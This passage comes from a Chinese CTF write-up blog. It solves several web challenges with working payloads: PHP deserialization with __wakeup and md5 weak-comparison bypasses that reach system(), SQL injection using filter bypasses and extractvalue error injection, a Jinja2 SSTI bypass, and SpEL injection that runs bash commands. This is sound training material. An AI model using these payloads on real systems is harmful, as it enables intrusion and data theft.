punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">lt</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$impo</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'hi'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$md51</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'weclome'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$md52</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'to NSS'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">impo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dxg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">impo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dxg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">impo</span><span class=\"token operator\">-></span><span class=\"token function\">fmm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">impo</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">md51</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">md52</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">md51</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">md52</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>         <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">impo</span><span class=\"token operator\">-></span><span class=\"token function\">fmm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">fin</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'https://www.ctfer.vip'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token variable\">$title</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">fmm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">title</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'NSS'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>   <span class=\"token variable\">$Data</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'NSS'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>   <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这道题目链子很简单，关键点就在于绕过 wakeup 函数和 md5，</p>\n<p s:1:“a”;N;s:3:“url”;N;s:5:“title”;N;=\"\">序列化触发__wakeup,__destruct，__wakeup 方法中，给 impo 实例一个 dxg 对象，并直接 return，无法获取有效信息，绕过__wakeup 的方法很简单，只需要将反序列化后的字符串，将对象属性数量改大，如，O:3:“fin”:3:{s:1:“a”;N;s:3:“url”;N;s:5:“title”;N;} =&gt; O:3:“fin”:4:</p>\n<p>__destruct 方法触发就很简单了，将自己当字符串输出，直接触发__toString 方法，返回 fmm 方法，至于 md5 加密是一个弱比较：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//md5 ($this->md51) == md5 ($this->md52)  弱等于</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// s155964671a  =md5=> 0e342768416822451524974117254469</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// s214587387a  =md5=> 0e848240448830537924465865611904</span></pre></td></tr></table></figure><figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">/?NSS=O:2:\"lt\":4:</span><span class=\"token punctuation\">&#123;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"impo\"</span><span class=\"token punctuation\">;</span><span class=\"token selector\">O:3:\"fin\":3:</span><span class=\"token punctuation\">&#123;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">1</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">6</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">21</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"https://www.ctfer.vip\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">5</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"title\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">9</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"cat /flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"md51\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">11</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"s155964671a\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"md52\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">11</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"s878926199a\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"gdouctf-2023ez_ze\"><a class=\"anchor\" href=\"#gdouctf-2023ez_ze\">#</a> [GDOUCTF 2023]&lt;ez_ze&gt;</h3>\n<h4 id=\"jinja2sstivim泄露\"><a class=\"anchor\" href=\"#jinja2sstivim泄露\">#</a> Jinja2,SSTI，vim 泄露</h4>\n<p>经测试，禁用了_ . []  \\ request pop os popen 等，</p>\n<p>绕过。可以通过使用 attr () 绕过，然后这里的 lipsum 用  测了一下发现是个方法</p>\n<pre><code>&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;\n</code></pre>\n<p>然后用他直接调用__globals__发现可以直接执行 os 命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们 tql</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/25.png\" alt=\"25\" /></p>\n<h2 id=\"2023125\"><a class=\"anchor\" href=\"#2023125\">#</a> 2023/12/5</h2>\n<h3 id=\"swpuctf-2022-新生赛ez_sql\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛ez_sql\">#</a> [SWPUCTF 2022 新生赛] ez_sql</h3>\n<h4 id=\"sql注入空格绕过双写绕过\"><a class=\"anchor\" href=\"#sql注入空格绕过双写绕过\">#</a> SQL 注入，空格绕过，双写绕过</h4>\n<p>进入题目：</p>\n<blockquote>\n<p>年轻的 Web 手啊！<br />\n看题目名就知道你该干嘛了吧～<br />\n 用相对安全的方式传参吧<br />\n奥对了参数是 nss</p>\n</blockquote>\n<p>post 传参 nss=1,</p>\n<p>得到：</p>\n<p This_1s_F4ke_flag=\"\">Flag: NSSCTF</p>\n<p Ar3_y0u_K1ngd1ng=\"\">This is true flag: NSSCTF</p>\n<p>假的 flag，参数为 1 的时候没有报错，为 2 和任何数的时候报，发现空格被过滤了，然后 union 需要双拼写</p>\n<p>0'/**/ununionion/**/select/**/1,2,3;#</p>\n<p>发现存在 3 个</p>\n<blockquote>\n<p>Flag: 2</p>\n<p>This is true flag: 3</p>\n</blockquote>\n<p>数据库为 NSS_db</p>\n<p>测表：</p>\n<p>2'/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='NSS_db'#</p>\n<p>得到：NSS_tb 和 users</p>\n<p>查表的字段发现 flag</p>\n<p>nss=2'/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb';#</p>\n<blockquote>\n<p>Flag: NSS_db</p>\n<p>This is true flag: id,Secr3t,flll444g</p>\n</blockquote>\n<p>查字段的数据</p>\n<p>nss=2'/**/ununionion/**/select/**/1,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_tb;#</p>\n<p>得到 flag。</p>\n<h3 id=\"nisactf-2022join-us\"><a class=\"anchor\" href=\"#nisactf-2022join-us\">#</a> [NISACTF 2022]join-us</h3>\n<h4 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h4>\n<p>看着很唬人，在登录界面看到：</p>\n<p>can u get flag ?</p>\n<p>输入 1 得到结果：</p>\n<p>message: txw4ever</p>\n<p>输入 1'# 发现正常显示。</p>\n<p>用 fuzz 字典模糊测试一下过滤了哪些关键字，过滤了很多，但可以使用 extractvalue 来进行报错注入，空格可以使用 /**/ 或者 () 绕过。</p>\n<p>首先得绕过 database ()</p>\n<p>这里其实我们可以通过报错来实现</p>\n<ul>\n<li>\n<p>database 里面的 as 被过滤，通过查询一个不存在的表，通过报错获得表名</p>\n<p><code>-1' || (select * from aa)#</code></p>\n<p>或者</p>\n</li>\n</ul>\n<figure class=\"highlight matlab\"><figcaption data-lang=\"MATLAB\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token operator\">'</span><span class=\"token operator\">|</span><span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">%23</span></pre></td></tr></table></figure><blockquote>\n<p>FUNCTION sqlsql.a does not exist</p>\n</blockquote>\n<pre><code class=\"language-mysql\">1'||extractvalue(1,0x7e)#\n报表\n1'||extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema like 'sqlsql')))#\n \nXPATH syntax error: '~Fal_flag,output'\n \n \n1'||extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name like 'sqlsql')))#\n</code></pre>\n<p>然后发现字段报不了。</p>\n<p>这时候就可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjExODQzMC9hcnRpY2xlL2RldGFpbHMvMTI1MTA3ODU0P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTY1ODkyOTI2ODE2NzgyNDI1MTc4MjU5JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZhbGwuJTI1MjIlMjU3RCZhbXA7cmVxdWVzdF9pZD0xNjU4OTI5MjY4MTY3ODI0MjUxNzgyNTkmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH5maXJzdF9yYW5rX2VjcG1fdjF+cGNfcmFua192MzUtNy0xMjUxMDc4NTQtbnVsbC1udWxsLjE0MiU1RXYzNSU1RWV4cGVyaW1lbnRfMjh3X3YxLDE4NSU1RXYyJTVFY29udHJvbCZhbXA7dXRtX3Rlcm09JUU2JTk3JUEwJUU1JTg4JTk3JUU1JTkwJThEJUU2JUIzJUE4JUU1JTg1JUE1JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">mysql 注入可报错时爆表名、字段名、库名</span></p>\n<p>所以：</p>\n<pre><code class=\"language-mysql\">tt=1'||extractvalue(1,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b using(id,data)) c)))#\nDuplicate column name 'i_tell_u_this_is_Fal(se)_flag_is_in_another'\n发现不是这个\n那么就去爆另一个吧\ntt=1'||extractvalue(1,concat(0x7e,(select * from (select * from output a join output b using(data)) c)))#\n</code></pre>\n<h2 id=\"2023127\"><a class=\"anchor\" href=\"#2023127\">#</a> 2023/12/7</h2>\n<h3 id=\"ezjava\"><a class=\"anchor\" href=\"#ezjava\">#</a> ezjava</h3>\n<h4 id=\"spel注入\"><a class=\"anchor\" href=\"#spel注入\">#</a> spel 注入</h4>\n<p>关于 spel 注入分析可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTI0NQ==\">SpEL 注入 RCE 分析与绕过</span></p>\n<p>先附上<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTklOUQlQjYlRTUlOUMlQkEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">靶场</span>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucG9sYXJjdGYuY29tLw==\">www.polarctf.com</span><br />\nezjava 这道题给了个 jar 包，所以先下载下来反编译看看怎么个事。</p>\n<p>反编译后看到这串代码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>demo<span class=\"token punctuation\">.</span>controller</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>expression<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ExpressionParser</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>expression<span class=\"token punctuation\">.</span>spel<span class=\"token punctuation\">.</span>standard<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SpelExpressionParser</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>expression<span class=\"token punctuation\">.</span>spel<span class=\"token punctuation\">.</span>support<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StandardEvaluationContext</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RequestMapping</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/SPEL\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">/* loaded from: demo1-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/demo/controller/spel.class */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> spel <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/vul\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">spelVul</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">ExpressionParser</span> parser <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SpelExpressionParser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">String</span> result <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span><span class=\"token function\">parseExpression</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">StandardEvaluationContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>熟悉 Java 的朋友就可以一眼定真，这不是 <code>spel</code>  表达式注入嘛？<br />\nex 参数没有任何过滤直接打就可。<br />\n路由： <code>/SPEL/vul</code> ，可以看到 <code>2-1</code>  确实返回了运算结果，说明能解析。</p>\n<p>由在 <code>/SPEL/vul</code></p>\n<p>没有过滤的 SPEL 注入，直接参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29naXBvcC5jb20vMjAyMy8wOC8wNi9TUEVMJUU4JUExJUE4JUU4JUJFJUJFJUU1JUJDJThGJUU2JUIzJUE4JUU1JTg1JUE1JUU2JTgwJUJCJUU3JUJCJTkzJUU1JThGJThBJUU1JTlCJTlFJUU2JTk4JUJFJUU2JThBJTgwJUU2JTlDJUFGLyMlRTUlOUIlOUIlRTMlODAlODElRTklOUMlQjglRTQlQkQlOTMlRTglOUUlQkElRTYlOTclOEIlRTQlQjglQjglRTUlOUIlOUUlRTYlOTglQkU=\"> Boogipop 的博客</span></p>\n<p>payload：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token constant\">SPEL</span><span class=\"token operator\">/</span>vul<span class=\"token operator\">?</span>ex<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InputStreamReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cat /app/flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"gbk\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"2023128\"><a class=\"anchor\" href=\"#2023128\">#</a> 2023/12/8</h2>\n<h3 id=\"hnctf-2022-week2easy_include\"><a class=\"anchor\" href=\"#hnctf-2022-week2easy_include\">#</a> [HNCTF 2022 WEEK2]easy_include</h3>\n<h4 id=\"nginx文件包含日志包含\"><a class=\"anchor\" href=\"#nginx文件包含日志包含\">#</a> Nginx，文件包含，日志包含</h4>\n<p>进入题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//WEB 手要懂得搜索</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token 